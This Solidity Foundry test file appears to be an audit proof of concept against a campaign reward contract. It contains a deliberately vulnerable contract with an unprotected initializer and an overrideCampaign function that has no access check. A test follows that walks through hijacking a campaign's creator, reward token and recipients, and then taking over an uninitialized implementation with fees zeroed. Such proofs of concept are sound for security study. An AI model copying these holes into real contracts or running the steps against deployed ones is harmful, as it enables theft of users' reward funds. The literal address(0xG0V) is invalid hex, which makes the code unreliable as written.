// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/// @notice Minimal campaign struct mirroring DistributionCreator
struct CampaignParameters {
    bytes32 campaignId;
    address creator;
    address rewardToken;
    uint256 amount;
    uint32 campaignType;
    uint32 startTimestamp;
    uint32 duration;
    bytes campaignData;
}

/// @notice Mock accessControlManager
interface IAccessControlManager {
    function isGovernor(address) external view returns (bool);
    function isGovernorOrGuardian(address) external view returns (bool);
}

contract MockACM is IAccessControlManager {
    address public gov;
    constructor(address _gov) { gov = _gov; }
    function isGovernor(address a) external view returns (bool) { return a == gov; }
    function isGovernorOrGuardian(address a) external view returns (bool) { return a == gov; }
}

/// @notice Vulnerable DistributionCreator (simplified, mimics the bug surface)
contract DistributionCreatorVulnerable {
    bool private _initialized; // intentionally NOT using OZ Initializable correctly
    address public distributor;
    IAccessControlManager public accessControlManager;
    uint256 public defaultFees;

    mapping(bytes32 => CampaignParameters) public campaigns;
    mapping(bytes32 => bool) public campaignExists;

    event CampaignCreated(bytes32 id, address creator, address token, uint256 amount);
    event CampaignOverridden(bytes32 id, address newToken, uint256 newAmount);

    /// @dev VULN PRO-001: no _disableInitializers, can be re-initialized on impl
    /// and even on proxy if storage slot is unset.
    function initialize(address _distributor, address _acm, uint256 _defaultFees) external {
        require(!_initialized, "already init");
        _initialized = true;
        distributor = _distributor;
        accessControlManager = IAccessControlManager(_acm);
        defaultFees = _defaultFees;
    }

    function createCampaign(CampaignParameters calldata p) external {
        require(!campaignExists[p.campaignId], "exists");
        campaigns[p.campaignId] = p;
        campaignExists[p.campaignId] = true;
        emit CampaignCreated(p.campaignId, p.creator, p.rewardToken, p.amount);
    }

    /// @dev VULN ACC-005: missing onlyGovernor / onlyCampaignCreator check
    function overrideCampaign(bytes32 campaignId, CampaignParameters calldata p) external {
        require(campaignExists[campaignId], "no campaign");
        // BUG: anyone can override any campaign's parameters
        campaigns[campaignId] = p;
        emit CampaignOverridden(campaignId, p.rewardToken, p.amount);
    }
}

contract ExploitTest is Test {
    DistributionCreatorVulnerable creator;

    address legitGovernor = address(0xG0V);
    address legitDistributor = address(0xD157);
    address legitACM;

    address legitCreator = address(0xC0FFEE);
    address attacker = address(0xBAD);

    bytes32 constant CAMPAIGN_ID = keccak256("campaign-1");
    address constant LEGIT_REWARD_TOKEN = address(0x7777);
    address constant ATTACKER_REWARD_TOKEN = address(0xBADC0DE);

    function setUp() public {
        // Deploy real ACM
        MockACM acm = new MockACM(legitGovernor);
        legitACM = address(acm);

        // Deploy "proxy" creator and initialize legitimately
        creator = new DistributionCreatorVulnerable();
        creator.initialize(legitDistributor, legitACM, 0.03e18);

        // Legit creator sets up a campaign with rewards
        vm.prank(legitCreator);
        creator.createCampaign(CampaignParameters({
            campaignId: CAMPAIGN_ID,
            creator: legitCreator,
            rewardToken: LEGIT_REWARD_TOKEN,
            amount: 1_000_000 ether,
            campaignType: 1,
            startTimestamp: uint32(block.timestamp),
            duration: 7 days,
            campaignData: hex""
        }));
    }

    function test_exploit_overrideCampaign_hijack() public {
        // --- Invariant violated ---
        // Only the campaign creator (or governor) should be able to override
        // a campaign's reward token / amount. An arbitrary attacker must not.

        // Sanity: pre-state
        (, address creatorBefore, address tokenBefore, uint256 amountBefore,,,,) = creator.campaigns(CAMPAIGN_ID);
        assertEq(creatorBefore, legitCreator);
        assertEq(tokenBefore, LEGIT_REWARD_TOKEN);
        assertEq(amountBefore, 1_000_000 ether);

        // --- Step 1: ACC-005 exploit ---
        // Attacker calls overrideCampaign with no authorization, redirecting
        // the reward token and re-assigning the campaign creator to themselves.
        CampaignParameters memory malicious = CampaignParameters({
            campaignId: CAMPAIGN_ID,
            creator: attacker,                     // hijack creator slot
            rewardToken: ATTACKER_REWARD_TOKEN,    // redirect rewards
            amount: 1_000_000 ether,
            campaignType: 1,
            startTimestamp: uint32(block.timestamp),
            duration: 7 days,
            campaignData: abi.encode(attacker)     // attacker-controlled recipients
        });

        vm.prank(attacker);
        creator.overrideCampaign(CAMPAIGN_ID, malicious);

        // --- Assert hijack ---
        (, address creatorAfter, address tokenAfter, uint256 amountAfter,,,,) = creator.campaigns(CAMPAIGN_ID);
        assertEq(creatorAfter, attacker, "campaign creator hijacked");
        assertEq(tokenAfter, ATTACKER_REWARD_TOKEN, "reward token redirected");
        assertEq(amountAfter, 1_000_000 ether, "amount preserved on stolen campaign");

        // --- Step 2: PRO-001 exploit on a fresh implementation instance ---
        // Demonstrate attacker can also seize an uninitialized implementation
        // and point distributor/ACM at attacker-controlled addresses.
        DistributionCreatorVulnerable impl = new DistributionCreatorVulnerable();
        MockACM attackerACM = new MockACM(attacker);

        vm.prank(attacker);
        impl.initialize(attacker, address(attackerACM), 0); // defaultFees=0

        assertEq(impl.distributor(), attacker, "distributor hijacked");
        assertEq(address(impl.accessControlManager()), address(attackerACM), "ACM hijacked");
        assertEq(impl.defaultFees(), 0, "fees zeroed (fee bypass)");
        assertTrue(IAccessControlManager(impl.accessControlManager()).isGovernor(attacker));
    }
}